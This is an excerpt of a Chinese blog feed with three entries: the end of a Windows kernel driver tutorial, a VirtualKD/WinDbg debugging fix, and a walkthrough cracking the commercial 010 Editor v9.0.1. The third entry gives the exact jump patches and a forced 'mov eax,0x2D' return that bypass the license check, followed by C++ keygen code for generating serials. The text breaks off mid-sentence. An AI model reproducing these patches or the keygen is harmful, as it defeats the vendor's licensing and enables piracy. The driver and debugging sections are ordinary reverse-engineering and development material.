字节，用十六进制表示为 0x76，正好为上面 Length 和 MaximumLength 大小，这说明此时的 Buffer 字符串没有 <code>\0</code> 结尾。</p><p>pRegistryPath 表示的是这个驱动所对应的注册表位置，我们知道，内核驱动是作为 windows 系统服务存在的，不同服务是通过服务名来识别的。一个 sys 驱动文件需要运行，首先会把该服务信息写入到注册表中，以服务名作为一个注册表的键名，如上图所示。</p><p>关于返回值，DriverEntry 的返回值类型为 NTSTATUS，定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> _Return_type_success_(<span class="keyword">return</span> &gt;= <span class="number">0</span>) LONG NTSTATUS;</span><br></pre></td></tr></table></figure><p>所以说 DriverEntry 的返回值类型实际为 LONG 类型，windows 操作系统规定 DriverEntry 返回 STATUS_SUCCESS 表示成功，返回其他值表示失败。实际上 STATUS_SUCCESS 是一个宏定义，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_SUCCESS ((NTSTATUS)0x00000000L) <span class="comment">// ntsubauth</span></span></span><br></pre></td></tr></table></figure><p>内核驱动作为 windows 服务运行，在执行具体代码前，驱动 SYS 文件首先会被映射到内核地址空间，作为内核的一个驱动模块，接着系统对这个驱动模块执行导入表初始化、修正重定位表中对应的数据偏移操作，最后系统会调用该驱动模块的 DriverEntry 入口函数，如果这个入口函数返回 STATUS_SUCCESS，系统认为这个驱动初始化成功；如果这个入口函数返回除 STATUS_SUCCESS 以外的其他值，系统认为驱动初始化失败，系统执行一系列的清理工作，并把驱动模块从内核空间中删除，从用户角度看，就是服务启动失败。</p><p>关于驱动卸载函数，当一个内核驱动被要求停止时，DriverObject-&gt;DriverUnload 指向的函数就会被系统调用，开发者可以在这个函数中执行一些清理相关工作。DriverUnload 函数非常重要，但重要并不等于必须，DriverUnload 函数是可选的，开发者可以不提供 DriverUnload 函数，这样做的结果是该驱动不支持停止，也就是说，只要开发者不提供 DriverUnload 函数，这个驱动对应的服务一旦启动后，再也无法停止。该特性被很多安全软件利用，刻意不提供 DriverUnload 函数，避免驱动被恶意停止。</p><div class="tip "><p>提示：驱动初始化失败不会触发 DriverUnload 函数调用，DriverUnload 只有在驱动服务成功启动后，被要求停止才会触发。</p></div><h2 id="一个基本的通用驱动程序框架"><a href="#一个基本的通用驱动程序框架" class="headerlink" title="一个基本的通用驱动程序框架"></a>一个基本的通用驱动程序框架</h2><p>以下为一个基本的通用驱动程序框架：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span> </span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pDriverObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s]Driver upload, Driver Object Address: %p&quot;</span>, __FUNCTION__, pDriverObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s]Hello Kernel World!\n&quot;</span>, __FUNCTION__);</span><br><span class="line">    <span class="keyword">if</span> (pRegistryPath != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s]Driver RegistryPath: %wZ\n&quot;</span>, __FUNCTION__, pRegistryPath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pDriverObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s]Driver Object Address: %p\n&quot;</span>, __FUNCTION__, pDriverObject);</span><br><span class="line">        pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内核入口函数&quot;&gt;&lt;a href=&quot;#内核入口函数&quot; class=&quot;headerlink&quot; title=&quot;内核入口函数&quot;&gt;&lt;/a&gt;内核入口函数&lt;/h2&gt;&lt;p&gt;具有 windows 应用层（用户态）开发经验的朋友应该很清楚，windows 应用程序有统一的 WinMa</summary>
      
    
    
    
    <category term="C/C++" scheme="https://zeronohacker.github.io/categories/C-C/"/>
    
    
    <category term="kernel" scheme="https://zeronohacker.github.io/tags/kernel/"/>
    
    <category term="driver" scheme="https://zeronohacker.github.io/tags/driver/"/>
    
  </entry>
  
  <entry>
    <title>解决 VirtualKD + Windbg 调试 win10 时无法弹出 Windbg 问题</title>
    <link href="https://zeronohacker.github.io/2020/04/05/solve-the-problem-that-windbg-cannot-pop-up-when-virtualkd-and-windbg-debugs-win10/"/>
    <id>https://zeronohacker.github.io/2020/04/05/solve-the-problem-that-windbg-cannot-pop-up-when-virtualkd-and-windbg-debugs-win10/</id>
    <published>2020-04-05T09:02:32.000Z</published>
    <updated>2021-09-19T09:11:01.309Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h2><p>将 VirtualKD 下的 target 目录复制到在虚拟机 win10 操作系统上，运行 vminstall.exe，注册好之后重启 win10，在启动项多了一个，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/68CB783BC81CC8797C5975B4BF71C06E.jpg" alt=""></p><p>这时候打开 vmmon.exe，选择好 windbg 程序，因为上面 win10 为 32 位，所以 windbg 选择 32 位，但请注意一下：</p><div class="tip "><p>启动项那一行意思是按 F8 进入选择手动禁止签名强制选项，因为从 win8 及后面的系统驱动文件必须经过微软的数字签名后，才可以运行，否则会加载失败，这在运行了 vminstall.exe 后会提示你要注意这一点。</p></div><p>完成以上后，按 F8 进入，选择禁用驱动程序强制签名选项，回车后发现 windbg 并不会弹出（我这里是用它来调试自己编写的驱动程序）。</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/4DED46D67DF478842D57342E8D746A89.jpg" alt=""></p><h2 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h2><p>在安装完 vminstall 后，需要先在运行中运行 msconfig 命令，显示窗口如下：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/DD0317F25B031615051FABDF51D74845.png" alt=""></p><p>选中第二个启动引导项，点击高级选项，在全局调试设置中的调试端口选择 COM1:（在打印机被移除情况下，因为打印机默认用这个端口），波特率选择 115200，点确定保存后会提示你要重启才能使更改生效，重启后，windbg 就能自动弹出了。</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>windbg 自动弹出后，需等待一会，win 10 操作系统会被中断，输入 g 命令让操作系统跑起来，进入主界面后，右下角会显示测试模式，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/F08596103CFA343760D1D3AE470A830D.png" alt=""></p><p>此时windbg 界面如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/81F7A00C42F70B72FC785FB14C02B9C5.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题复现&quot;&gt;&lt;a href=&quot;#问题复现&quot; class=&quot;headerlink&quot; title=&quot;问题复现&quot;&gt;&lt;/a&gt;问题复现&lt;/h2&gt;&lt;p&gt;将 VirtualKD 下的 target 目录复制到在虚拟机 win10 操作系统上，运行 vminstall.exe，注</summary>
      
    
    
    
    <category term="C/C++" scheme="https://zeronohacker.github.io/categories/C-C/"/>
    
    
    <category term="windbg" scheme="https://zeronohacker.github.io/tags/windbg/"/>
    
    <category term="debug" scheme="https://zeronohacker.github.io/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>逆向分析商业软件 010 Editor 及注册机编写</title>
    <link href="https://zeronohacker.github.io/2019/05/28/reverse-analysis-of-business-software-010-editor-and-registration-machine-writing/"/>
    <id>https://zeronohacker.github.io/2019/05/28/reverse-analysis-of-business-software-010-editor-and-registration-machine-writing/</id>
    <published>2019-05-28T07:38:38.000Z</published>
    <updated>2021-09-19T08:04:00.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="010-Editor-简单介绍"><a href="#010-Editor-简单介绍" class="headerlink" title="010 Editor 简单介绍"></a>010 Editor 简单介绍</h2><p><code>010 Editor</code> 是一款非常强大的文本、十六进制编辑器，除了文本、十六进制编辑外，还包括文件解析、计算器、文件比较等功能，但它真正的强大之处还在于文件的解析功能。我们可以使用 <code>010Editor</code> 官方网站提供的解析脚本对 <code>avi、bmp、png、exe</code> 等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。但是 <code>010 Editor</code> 是收费的，不过官方给出了 30 天的免费使用期限供用户体验。本文将为大家分析如何去除使用限制和编写注册机。目前最新版本为 <code>v9.0.1</code>，也是本文将分析的版本。<code>010 Editor</code> 官网：<a href="http://www.sweetscape.com/010editor/">http://www.sweetscape.com/010editor/</a></p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1m_KwL9zqK1RjSZFj762lCFXaL.png" alt=""></p><p>2 暴力破解分析</p><p>在软件破解中，暴力破解可谓是一个最基本，也是最常见的一种手段，无非就是改跳转指令（例如 JNZ 改 JZ、JZ 改 JNZ、把跳转指令 NOP 掉等），让它跳的时候不跳，不该跳的时候跳，从而避开检测以获取它的永久使用权限。下面就列下 <code>010 Editor</code> 暴力破解的分析步骤：</p><ul><li>找到注册窗口；</li><li>测试注册窗口的反应；</li><li>根据反应做出下一步分析的打算（猜测 API、API 下断动态调试、挑出敏感字符串，在程序中搜索）；</li><li>动态分析，定位关键跳转，修改代码；</li><li>动态分析，定位关键 CALL，修改代码；</li></ul><p>在官网下载最新版本并在你的计算机上安装好后，双击让它运行起来，并点击关于，会看到 <code>Free 30-Day Trial</code> 字样，另外，注册窗口在 <code>Tools --&gt; Register</code> ，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB12XKALVzqK1RjSZFo762fcXXaD.png" alt=""></p><p>点击 <code>Check License</code> 按钮，弹出如下提示：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1qpGrL9rqK1RjSZK9760yypXaY.png" alt=""></p><p>上述意思是你输入了一个无效的用户名或者是密码，也就是说，你点击那个按钮会弹出这个提示窗口，那么我们可以从这个提示窗口入手，比如对创建这个窗口的 API 下断，或者是寻找提示信息的这段字符串。废话不多说，上 OD，附加进程调试，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1ecqJLZfpK1RjSZFO7616nFXae.png" alt=""></p><p>附加后，我们需要来到主模块，点击 OD 上方的 <code>e</code> 按钮，点击第一个，这里需要重复操作两次才到主模块，完成上述操作后，我们先来看下程序主模块导入了哪些函数，<code>右键 -&gt; 查找 -&gt; 当前模块中的名称（标签）</code>，或者按下快捷键 <kbd>Ctrl</kbd> + <kbd>N</kbd>，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1b2qAL3HqK1RjSZFP763wapXar.png" alt=""></p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1eECCL3HqK1RjSZFE763GMXXaq.png" alt=""></p><p>在上面图中可以看出 <code>010 Editor</code> 调用了大量的 Qt 库函数，由此可猜测它是由 Qt 编写的，对于 Qt 中创建窗口函数，个人觉得，不管是何种高级语言，在底层中还是得调用诸如 <code>CreateWindow、MessageBox</code> 以及一些 <code>Dialog</code> 相关的函数，这些函数位于 <code>User32.dll</code> 中，同样点击 OD 上方的小 <code>e</code> 按钮，在里面找到 <code>user32.dll</code>，双击进去，在这里要说一点就是，创建窗口的 API 函数不止一个，而且也不存在 <code>CreateWindow、MessageBox</code> 这类函数，其实它们只是个宏，在深入一点都是调用 <code>Ex</code> 的版本，那么问题又来了，是调用 <code>A 版</code> 还是调用 <code>W 版</code> 的，学过 windows 编程的都知道，<code>A 版</code> 的最终还是会去调用 <code>W 版</code> 的， 所以我们不妨先对 <code>CreateWindowExW</code> 函数下断，按 <kbd>Ctrl</kbd> + <kbd>G</kbd>，输入 <code>CreateWindowExW</code>，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1W11DL7PoK1RjSZKb7601IXXa3.png" alt=""></p><p>转到这里后，对该地址下断，回到 <code>010 Editor</code> 注册界面，点击 <code>Check Lincense</code>，之后你会发现程序断下来了，这说明断点下对了，程序停在了 <code>0x74892480</code> 地址处。断下来之后，我们接下来要想的是哪里调用了这个函数，我们可以上方的 <code>k</code> 小按钮来查看，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1om1DLZbpK1RjSZFy760_qFXas.png" alt=""></p><p>通过栈回溯分析，可以看出，在地址 <code>0x00EFCD24</code> 上的函数过程有个很显眼的字 <code>show</code>，貌似跟显示窗口有关，我们双击进去看下里面有什么可以利用的信息，结果没发现有价值的东西，不要慌，我们继续点击上面这个地址的下一个地址，双击进行查看，结果也没有，再跟进去下一个地址，也就是 <code>0x00EFCDFC</code> 处，双击进去，会发现如下这种情况：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB17deAL8LoK1RjSZFu760n0XXa1.png" alt=""></p><p>通过上图可以看出，在这里面出现了大量可疑的字符串，其中 <code>Invalid name or password......</code> 这个字符串就是我们随意输入用户名和密码时弹出的信息提示，该处为一个 <code>push</code> 指令，我们向上看会发现该处是由 <code>0x1DE8489</code> 处跳转过来的，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1S_5PLZfpK1RjSZFO7616nFXaO.png" alt=""></p><p>不妨在 <code>0x1DE8489</code> 处下断点，把之前的断点禁用或者删除，回到注册界面，点击 <code>Check License</code>，会发现在该处断下来了，F8 一下就跳到无效密码处，在该 JNZ 指令上有三组 CMP 指令，并且第一组 CMP 指令是从地址 <code>0x01DE8336</code> 处跳转过来的，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1Qzq1L7voK1RjSZFw763iCFXaI.png" alt=""></p><p>我们来到第一组 CMP 指令源跳转处，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1zrzgL4jaK1RjSZKz760VwXXaH.png" alt=""></p><p>我们不妨在上面处下个断，重新回到注册界面，点击 <code>Check License</code>，会发现它会断在刚下的这个断点处，按 F8 下去，你会发现有两个关键的地方，一个是 <code>EDI</code> 的值，一个是 <code>EBX</code> 的值，前者需要和 <code>0xDB</code> 这个值作比较，后者则需要跟 <code>0xE7</code> 这个值作比较，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1mRr0MwTqK1RjSZPh760fOFXar.png" alt=""></p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1boL9MpzqK1RjSZFo762fcXXam.png" alt=""></p><p>这些值都是来自于 <code>EAX</code> 的赋值，而我们知道，<code>EAX</code> 寄存器存放的是函数的返回值，所以我们需要跟进函数里头去看下返回值是如何返回的，但现不急着跟进去，因为现在是暴力破解它，所以我们只需将地址 <code>0x019D8336</code> 处的 JNZ 指令给 NOP 掉即可，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB14ZvHMIfpK1RjSZFO7616nFXaT.png" alt=""></p><p>最后保存文件即可，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1MM2pMSrqK1RjSZK9760yypXaL.png" alt=""></p><p>双击运行 Dump 出来的文件，点击 <code>Check License</code> 会发现弹出如下提示：</p><div class="tip "><p>提示：由于此文写的比较早，当时上传的图是使用免费图床，官方会不时清理免费用户的图，所以导致缺失。</p></div><p>点击 <code>OK</code> 就可以进入到主界面了，这样就达到了暴力破解的目的了，但是这种方法对于这个软件来说有一点不好的地方的就是每次运行都会弹出这个注册界面，需再次点击 <code>Check License</code>，这样才能够使用。我们能不能双击直接进入呢？答案肯定能，我们重新理一下整个过程，如下：</p><div class="tip "><p>提示：由于此文写的比较早，当时上传的图是使用免费图床，官方会不时清理免费用户的图，所以导致缺失。</p></div><p>如果 EBX 为 0xE7 则跳，跳过之后，再对 EDI 比较，此时 EDI 为 0x177，0x177 不等于 0xDB 又跳走，接着有两次对 EDI 进行比较，值分别为 0xED 和 0x20C，我们知道，EDI 值为 0x177，所以两处的 JE 指令不成立，最后对比 EBX 的值，用它跟 0x93 对比，很明显 0xE7 不等于 0x93，所以 JNZ 指令成立，将跳过密码已被接受过程。</p><p>所以为了一开始不跳，<code>EBX</code> 的值要不为 <code>0xE7</code>，<code>EDI</code> 的值要为 <code>0xDB</code>，在上面谈到的两个重要的 CALL 里，第二个 CALL 是根据第一个 CALL 的最终 <code>EAX</code> 的来进行对 <code>EDI</code> 进行赋值，所以，为了让 <code>EDI</code> 的值为 <code>0xDB</code>，<code>EBX</code> 的值要为 <code>0x2D</code>，也就是说第一个 CALL 的最终 <code>EAX</code> 值要为 <code>0x2D</code>，我们可以跟进第一个 CALL 内，在最开头部分写下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x2D</span><br></pre></td></tr></table></figure><p>如下：</p><div class="tip "><p>提示：由于此文写的比较早，当时上传的图是使用免费图床，官方会不时清理免费用户的图，所以导致缺失。</p></div><p>修改完后，会发现下一条指令的 <code>OPCODE</code> 下有一根下划线，这说明需要重定位，下次再运行时可能就不是这个地址了，所以我们需要做的就是把软件的重定位标志置为 0 保存即可，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1_W_QMMHqK1RjSZFE763GMXXaO.png" alt=""></p><p>重新运行 OD，将其载入，在最开头部分写下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x2D</span><br><span class="line">retn 0x8</span><br></pre></td></tr></table></figure><p>如下所示：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1p9fSMQPoK1RjSZKb7601IXXaE.png" alt=""></p><p>最后 Dump 出来，双击运行下看是否成功，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1t6LGMMDqK1RjSZSy761xEVXaY.png" alt=""></p><p>由此可见，我们已成功完美破解了 <code>010 Editor</code> 了，尽情享用吧！</p><h2 id="初步分析算法"><a href="#初步分析算法" class="headerlink" title="初步分析算法"></a>初步分析算法</h2><p>在这小节当中，会对 <code>010 Editor</code> 注册算法进行详细分析。回顾上一小节，我们只是修改了一个跳转，但关键点还是在于那两个重要的 CALL，尤其是第一个 CALL，必须让它返回 <code>0x2D</code> 才是正确的，所以本小节将会跟进第一个关键 CALL 内去分析注册算法。在跟进之前，我们先来看下这个 CALL 有哪些参数，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1UyOaM7voK1RjSZFw763iCFXan.png" alt=""></p><p>我们知道，<code>ECX</code> 传参为 this 指针，后面两个分别为 <code>0x4596</code> 和 <code>0xA</code>，传的参肯定和用户名和密码有关系，我们不妨跟进 <code>ECX</code> 地址所在处数据窗口，<code>ECX</code> 的值为 <code>0330B300</code>，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1dnx9M3HqK1RjSZFg7617JXXag.png" alt=""></p><p>从上图可知，这个 this 指针应该是指向一个字符串数组，接着我们需进入到地址 <code>0330B304</code> 处，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1WBOhM7voK1RjSZFw763iCFXa7.png" alt=""></p><p>在这里我们需要转化成 <code>Unicode 16 位</code> 查看，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1wIt8M8LoK1RjSZFu760n0XXap.png" alt=""></p><p>注意地址的对应，从上图可知，这个字符串就是我们输入的用户名 <code>fanfanblog.cn</code>，我们返回到 this 指针下的第二个地址处跟进到数据窗口看下，也是同样的操作，如下：</p><div class="tip "><p>提示：由于此文写的比较早，当时上传的图是使用免费图床，官方会不时清理免费用户的图，所以导致缺失。</p></div><p>同样地，注意地址的对应，在这一段为你输入的密码，也可叫做序列号。知道这些后，对后面分析有一定帮助。我们跟进去第一个重要 CALL 内，以下作了一个简单的分析：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1Dx1DM4jaK1RjSZKz760VwXXaL.png" alt=""></p><p>由上面分析知，<code>ECX</code> 存放的是 this 指针，而 this 指针指向的是一个字符串数组，这个数组存放着用户名和密码字符串，我已将说明标注在上图中。所以为什么说之前我们需要跟进 <code>ECX</code> 中的数据窗口去查看下这个地址里存放的是什么东西，那么在上图分析过程中起到一个辅助作用。</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1aDOcM9zqK1RjSZPx7634tVXav.png" alt=""></p><p>在检测用户名和密码是否为空后，紧接着将一个局部变量的值压和栈中，右键栈中的地址数据窗口跟随，会发现这个数据是你输入的密码字符串，而且为 16 进制，所以说 PUSH 指令下的这个 CALL，是将密码字符串转为 16 进制字节的数据。如果你不放心，可以多测试几下，这里把密码换成 <code>1234-5678-9009-8765-4321</code>，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1viCoM9zqK1RjSZFp761kSXXav.png" alt=""></p><p>我们接着分析，在接下来，程序会将字符串 <code>999</code> 压入栈中进行一番不知什么操作，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB13qMFM4jaK1RjSZKz760VwXXaZ.png" alt=""></p><p>这一段并没有对用户名和密码字符串进行操作，所以不去深究它也无太大影响，在逆向分析中，并不是每条都分析一遍你才能破解它，而是找到关键部分进行分析，这一小段为一个小循环，这个 CALL，根据提示，应该 Qt 中运算符重载，由于对 Qt 不是很熟悉，而且这小段并未对用户名和密码进行操作，所以跳过它往下继续分析。从循环开始，那就是真正的到达算法处，算法并不是很难，但是有一点绕，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1gBAgM9zqK1RjSZFH7623CpXaT.png" alt=""></p><p>在上图中，有几个关键点地方，第一个圈起来的，它会拿你输入的密码的第 4 组数据去和 <code>0x9C、0xAC、0xFC</code> 这三个数进行比较，如果不是这三个数中的其中一个，那么程序会将 <code>0xE7</code> 赋值给 <code>EAX</code>，而在前面一小节当中，<code>EAX</code> 的值不能为 <code>0XE7</code>，否则失败，所以我们令 JNZ 下方这条指令为新的 EIP，否则 JNZ 条件成立跳过去了，就不好分析了，最后我们可以肯定，密码有三个版本，这里只分析下 <code>0x9C</code> 这个版本。第二个关键点是第二个圈起来的地方，跟进这个 CALL 里，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1eP.cM6DpK1RjSZFr76178VXaU.png" alt=""></p><p>同样，代码也不复杂，主要是判断余数是否为 0，如果为 0，那么就返回商，如果不为 0，那么就返回 0。所以这么一整段下来，在对 <code>k[0]、k[1]、k[2]、k[3]、k[4]、k[5]、k[6]、k[7]</code> 在进行操作，而我们输入的密码有 10 组，OD 中并没看到对 <code>k[8]、k[9]</code> 进行处理，其实这里有个关子，那就是当你密码中第 4 组数据为 <code>0x9C</code>，那么生成的密码并没有 10 组，而是 8 组，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1Lz3EM3HqK1RjSZFk760.WFXa1.png" alt=""></p><p>但不管怎么说，在 <code>0x9C</code> 情况下对每组数据进行异或、相加、与等操作，我们不妨先建立下注册机模型，我这里用的是 MFC 进行编写，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1Uy6ZM9zqK1RjSZPc762TepXa1.png" alt=""></p><p>在 <code>Generate</code> 生成按钮添加单击事件，相关代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成密码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMy010EditorRegisterDlg::OnBnClickedButtonGenerate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    m_edit_password.<span class="built_in">SetWindowText</span>(<span class="string">L&quot;&quot;</span>);</span><br><span class="line">    CString str;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">    BYTE k[<span class="number">8</span>] = &#123; <span class="number">0x12</span>,<span class="number">0x34</span>,<span class="number">0x56</span>,<span class="number">0x9C</span>,<span class="number">0x90</span>,<span class="number">0x09</span>,<span class="number">0x87</span>,<span class="number">0x65</span> &#125;;</span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        BYTE k0 = <span class="built_in">rand</span>() % <span class="number">0xFF</span>;</span><br><span class="line">        BYTE k6 = <span class="built_in">rand</span>() % <span class="number">0xFF</span>;</span><br><span class="line">        <span class="comment">// AL = (k[0]^k[6]^0x18 + 0x3D)^0xA7</span></span><br><span class="line">        BYTE AL = (k0 ^ k6 ^ <span class="number">0x18</span> + <span class="number">0x3D</span>) ^ <span class="number">0xA7</span>;</span><br><span class="line">        <span class="keyword">if</span> (AL &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            k[<span class="number">0</span>] = k0;</span><br><span class="line">            k[<span class="number">6</span>] = k6;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ESI = (0x100*(k[1]^k[7] &amp; 0xFF) + k[2]^k[5] &amp; 0xFF)&amp;0xFFFF</span></span><br><span class="line">    <span class="comment">// EAX = ((ESI^0x7892+0x4D30)^0x3421)&amp;0xFFFF / 0xB</span></span><br><span class="line">    <span class="comment">// 判断余数是否为0，为0返回商，不为0返回0</span></span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        BYTE k1 = <span class="built_in">rand</span>() % <span class="number">0xFF</span>;</span><br><span class="line">        BYTE k7 = <span class="built_in">rand</span>() % <span class="number">0xFF</span>;</span><br><span class="line">        BYTE k2 = <span class="built_in">rand</span>() % <span class="number">0xFF</span>;</span><br><span class="line">        BYTE k5 = <span class="built_in">rand</span>() % <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">        DWORD ESI = (<span class="number">0x100</span> * (k1 ^ k7 &amp; <span class="number">0xFF</span>) + k2 ^ k5 &amp; <span class="number">0xFF</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        DWORD EAX = (((ESI ^ <span class="number">0x7892</span>) + <span class="number">0x4D30</span>) ^ <span class="number">0x3421</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">if</span> (EAX % <span class="number">0xB</span> == <span class="number">0</span> &amp;&amp; EAX / <span class="number">0xB</span> &lt;= <span class="number">0x3E8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            k[<span class="number">1</span>] = k1;</span><br><span class="line">            k[<span class="number">7</span>] = k7;</span><br><span class="line">            k[<span class="number">2</span>] = k2;</span><br><span class="line">            k[<span class="number">5</span>] = k5;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    str.<span class="built_in">Format</span>(<span class="string">L&quot;%02x%02x-%02x%02x-%02x%02x-%02x%02x&quot;</span>, k[<span class="number">0</span>], k[<span class="number">1</span>], k[<span class="number">2</span>], k[<span class="number">3</span>], k[<span class="number">4</span>], k[<span class="number">5</span>], k[<span class="number">6</span>], k[<span class="number">7</span>]);</span><br><span class="line">    m_edit_password.<span class="built_in">SetWindowText</span>(str.<span class="built_in">MakeUpper</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码只是让你遇到那两个 JE 和一个 JA 